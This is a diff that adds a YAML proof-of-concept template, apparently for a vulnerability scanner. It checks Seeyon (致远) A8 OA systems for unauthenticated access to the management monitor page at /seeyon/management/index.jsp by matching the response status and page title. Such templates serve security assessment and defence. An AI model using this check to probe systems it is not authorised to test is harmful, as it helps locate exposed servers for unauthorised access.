@@ -1,0 +1,15 @@
+id: poc-yaml-seeyon-a8-management-monitor-auth
+info:
+  name: 致远 A8 管理监控系统未授权访问漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 致远OA
+requests:
+- method: GET
+  path: /seeyon/management/index.jsp
+  expression: 'status_code == 200 && contains(title, "A8 Management Monitor")
+
+    '
+variables: {}
+transport: http
